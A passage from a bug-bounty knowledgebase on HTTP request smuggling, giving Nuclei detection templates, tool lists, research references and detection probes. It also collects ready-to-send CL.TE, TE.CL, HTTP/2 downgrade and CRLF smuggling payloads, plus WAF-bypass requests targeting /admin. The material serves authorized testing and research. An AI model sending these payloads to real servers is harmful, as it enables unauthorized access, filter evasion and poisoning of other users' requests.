  description: |
    Detects HTTP/2 to HTTP/1.1 downgrade smuggling.

http:
  - raw:
      - |
        POST / HTTP/2
        Host: {{Hostname}}
        Content-Length: 0

        SMUGGLED
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 404'
        condition: and
```

### Client-Side Desync Detection

```yaml
id: client-side-desync

info:
  name: Client-Side Desync
  author: pdteam
  severity: high
  description: |
    Detects endpoints that ignore Content-Length, enabling CSD.

http:
  - raw:
      - |
        POST /favicon.ico HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 5

        X
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - '!contains(body, "Unrecognised method")'
        condition: and
```

---

## Tools and Scanners

| Tool | Purpose | URL |
|------|---------|-----|
| **HTTP Request Smuggler** | Burp extension for automated detection | PortSwigger BApp Store |
| **Turbo Intruder** | High-speed HTTP/2 attack engine | github.com/PortSwigger/turbo-intruder |
| **http2smugl** | HTTP/2 smuggling detection | github.com/neex/http2smugl |
| **h2csmuggler** | H2C smuggling exploitation | github.com/BishopFox/h2csmuggler |
| **smuggler** | Python desync testing | github.com/defparam/smuggler |
| **Param Miner** | Internal header discovery | PortSwigger BApp Store |
| **Nuclei** | Vulnerability scanner | github.com/projectdiscovery/nuclei |
| **httpx** | Fast HTTP prober | github.com/projectdiscovery/httpx |
| **katana** | Web crawler | github.com/projectdiscovery/katana |
| **Burp Suite** | Web proxy/scanner | portswigger.net |

---

## Advanced Research

### HTTP/1.1 Must Die: The Desync Endgame

PortSwigger's 2025 research introduces **parser discrepancy detection** - bypassing widespread desync defenses by identifying root-cause parsing differences rather than relying on timeout-based detection.

### Novel Desync Triggers

1. **CL.0**: Back-end ignores Content-Length entirely
2. **H2.0**: HTTP/2 equivalent of CL.0
3. **Pause-based**: Server timeout implementations
4. **Connection-state**: First-request validation/routing flaws
5. **Header smuggling**: Injecting headers via H2 to H1 translation

### HTTP/3 Considerations

HTTP/3 (QUIC) uses different framing but similar downgrade risks. http2smugl includes experimental HTTP/3 support (`https+h3://`), though no confirmed vulnerabilities have been found yet.

### Research Pipeline

1. Scan bug bounty targets with HTTP Request Smuggler
2. Manually confirm with Burp Repeater + Turbo Intruder
3. Identify gadget chains for impact demonstration
4. Report with clear reproduction steps and impact

---

## Bug Bounty Writeups

### Key Writeups and Resources

- **HTTP Desync Attacks: Request Smuggling Reborn** (James Kettle, 2019)
- **HTTP/2: The Sequel is Always Worse** (James Kettle, 2021)
- **Browser-Powered Desync Attacks** (James Kettle, 2022)
- **Practical Web Cache Poisoning** (James Kettle, 2018)
- **Web Cache Entanglement** (James Kettle, 2020)
- **HTTP/1.1 Must Die: The Desync Endgame** (James Kettle, 2025)
- **H2C Smuggling in the Wild** (Assetnote, 2021)
- **A Pentester's Guide to HTTP Request Smuggling** (Busra Demir, 2020)
- **HTTP Request Smuggling via Higher HTTP Versions** (Emil Lerner)

### Bounty Ranges

| Target | Vulnerability | Bounty |
|--------|--------------|--------|
| Netflix | H2.CL | $20,000 |
| Atlassian | H2.X | $15,000 |
| Verizon (AOL) | H2.TE | $10,000 |
| Verizon (Oath) | H2.TE | $7,000 |
| Netlify | H2.TE + CRLF | $4,000 |
| Various | CL.TE / TE.CL | $2,000-$15,000 |

---

## Payload Collections

### Classic Request Smuggling Payloads

```http
# CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# TE.TE (obfuscated)
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: xchunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### HTTP/2 Specific Payloads

```http
# H2.CL
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com

# H2.TE
POST / HTTP/2
Host: target.com
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

# H2.TE via CRLF
POST / HTTP/2
Host: target.com
foo: bar\r\n\r\ntransfer-encoding: chunked

0\r\n\r\n\r\nGET /admin HTTP/1.1\r\n\r\nHost: target.com\r\n\r\n\r\n

# H2.X (request splitting)
GET / HTTP/2
Host: target.com
foo: bar\r\n\r\nHost: target.com\r\n\r\nGET /admin HTTP/1.1\r\n\r\nX-Ignore: x

# Pseudo-header abuse
GET /admin HTTP/1.1 HTTP/2
Host: target.com
:path /fakepath
```

### H2C Upgrade Payload

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

---

## WAF Bypasses

### Technique 1: Protocol Confusion

WAFs often inspect HTTP/1.1 but not HTTP/2. Send attack via H2 to bypass WAF, which is then downgraded to H1 behind the WAF.

### Technique 2: Header Smuggling

```http
:method POST
:path /
:authority target.com
x-waf-bypass: 1\r\n\r\nX-Real-IP: 127.0.0.1
```

### Technique 3: Request Tunnelling

Use request tunnelling to send headers that the WAF would normally strip:

```http
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
X-Internal-Header: true
X-Admin-Token: secret
```

### Technique 4: Encoding Tricks

```http
Transfer-Encoding: chun\x4b\x65\x64
Content-Length: %30
```

---

## Detection Techniques

### Timeout-Based Detection

```http
# CL.TE probe - front-end uses CL, back-end uses TE
POST /about HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 41

Z
Q
```

If vulnerable: Back-end waits for chunk size, times out.

```http
# TE.CL probe - front-end uses TE, back-end uses CL
POST /about HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
X
0
```

If vulnerable: Front-end forwards only 4 bytes, back-end waits for more.

### Differential Response Detection

Send ambiguous request followed by normal request. If second request gets unexpected response (e.g., 404 instead of 200), desync confirmed.

### HTTP/2 Specific Detection

```http
# H2.CL detection
POST / HTTP/2
Host: target.com
Content-Length: 0

X
```

Send twice. If second request returns 404 or error, H2.CL confirmed.

```http
# H2.TE detection
POST / HTTP/2
Host: target.com
Transfer-Encoding: chunked

0

X
```

Send twice. If second request affected, H2.TE confirmed.

### Connection State Probe

```http
GET / HTTP/1.1
Host: allowed.comGET / HTTP/1.1
Host: internal.target.com
```

If second request reaches internal site, first-request validation flaw exists.

### Pause-Based Detection

1. Send headers only (no body)
2. Wait for server timeout response
3. Send body
4. If body processed as new request, pause-based desync exists

---

## References

### Primary Research Papers

1. Kettle, J. (2019). *HTTP Desync Attacks: Request Smuggling Reborn*. PortSwigger Research.
2. Kettle, J. (2021). *HTTP/2: The Sequel is Always Worse*. PortSwigger Research.
3. Kettle, J. (2022). *Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling*. PortSwigger Research.
4. Kettle, J. (2018). *Practical Web Cache Poisoning*. PortSwigger Research.
5. Kettle, J. (2020). *Web Cache Entanglement: Novel Pathways to Poisoning*. PortSwigger Research.
6. Kettle, J. (2025). *HTTP/1.1 Must Die: The Desync Endgame*. PortSwigger Research.

### Tools and Resources

- [PortSwigger Web Security Academy - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger Web Security Academy - HTTP/2](https://portswigger.net/web-security/http2)
- [HTTP Request Smuggler (Burp Extension)](https://github.com/PortSwigger/http-request-smuggler)
- [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
- [http2smugl](https://github.com/neex/http2smugl)
- [h2csmuggler](https://github.com/BishopFox/h2csmuggler)
- [smuggler](https://github.com/defparam/smuggler)
- [PayloadsAllTheThings - Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling)
- [HackTricks - HTTP Request Smuggling](https://book.hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html)
- [Nuclei Templates - Request Smuggling](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration/request-smuggling)

### CVEs

- CVE-2021-21295 (Netty / Netflix)
- CVE-2021-33193 (Apache mod_proxy)
- CVE-2022-20713 (Cisco ASA WebVPN)
- K97045220 (F5 Big-IP)
- K50375550 (F5 - New Relic issue)

### Community Resources

- [YesWeHack - HTTP Request Smuggling Guide](https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities)
- [Outpost24 - HTTP/2 Downgrading Walkthrough](https://outpost24.com/blog/request-smuggling-http-2-downgrading/)
- [BishopFox - H2C Smuggling](https://bishopfox.com/blog/h2c-smuggling-request)
- [Assetnote - H2C Smuggling in the Wild](https://www.assetnote.io/resources/research/h2c-smuggling-in-the-wild)
- [Cobalt - Pentester's Guide to HTTP Request Smuggling](https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)

---

> **Disclaimer**: This knowledgebase is for authorized security testing and bug bounty hunting only. Always obtain proper authorization before testing any system. The techniques described here can cause significant damage if used improperly.

> **Contributing**: This is a living document. As new research emerges, update relevant sections with new payloads, case studies, and tools.
